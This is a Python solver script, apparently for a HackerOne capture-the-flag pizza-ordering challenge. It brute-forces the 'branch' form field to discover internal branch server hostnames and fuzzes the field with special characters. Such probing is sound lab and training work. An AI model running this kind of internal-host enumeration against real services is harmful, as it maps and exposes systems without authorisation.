import requests
import string
import sys

url = 'https://pizza.hacktivity.h1ctf.com/order'
#url = 'https://putsreq.com/zjKDibKByPTDXWjQMhIq'

def send(data = False):
    if data == False:
        data = makeData()

    return requests.post(url, data=data)

def makeData(toppings = []):
    data = {
        'branch': 0,

        'address[line_1]': '',
        'address[line_2]': '',
        'address[line_3]': '',
        'address[city]': '',
        'address[state]': '',
        'address[zipcode]': '',

        'email': '',
        'discount_code': ''
    }

    if toppings != []:
        data['toppings[]'] = toppings

    return data

def checkBranch(branch):
    data = makeData()
    data['branch'] = branch
    return send(data)

def hasBranch(branch):
    response = checkBranch(branch)
    data = response.json()
    if data['success']:
        return True

    if data['error_msg'] != f'Invalid format of branch server detected: {branch}.branch.internal.pizza.hacktivity.h1ctf.com':
       print(data)

    return False

def discoverInternalDNS(value = -1):
    while True:
        sys.stdout.write(f"\r{value}")

        if hasBranch(value):
            print(f"\nBranch Found {value}\n")

        value += 1

def fuzz():
    alphabet = string.ascii_letters + string.digits + '!@#$%^&*()[]{};:,./<>?\|`~-=_+"\''
    for char in alphabet:
        response = checkBranch(char)
        print(char, response.json())

# discoverInternalDNS(1000)
discoverInternalDNS(4939)

#fuzz()

# print(checkBranch("wtf").json())
